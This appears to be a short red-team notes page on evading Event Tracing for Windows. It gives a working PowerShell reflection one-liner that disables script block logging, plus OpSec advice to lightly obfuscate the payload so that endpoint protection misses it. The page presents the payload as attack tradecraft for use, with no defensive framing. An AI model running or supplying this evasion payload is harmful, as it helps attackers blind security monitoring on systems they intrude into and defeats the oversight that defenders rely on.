---
title: ETW
---

Endpoint protections use *Event Tracing for Windows* as an additional source of information.

> **OpSec:**
> The payloads below require obfuscation.
> Heavily obfuscated payloads are detected more frequently than payloads that are only slightly modified in the right places.

Disable script block logging in PowerShell ([source](https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32)).

~~~ ps1
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled', 'NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider', 'NonPublic,Static').GetValue($null), 0)
~~~

References:

- [twitter.com/nas_bench/status/1646252357020205060](https://twitter.com/nas_bench/status/1646252357020205060), since Powershell 5 script blocks with certain suspicious keywords get logged regardless of the actual logging policy
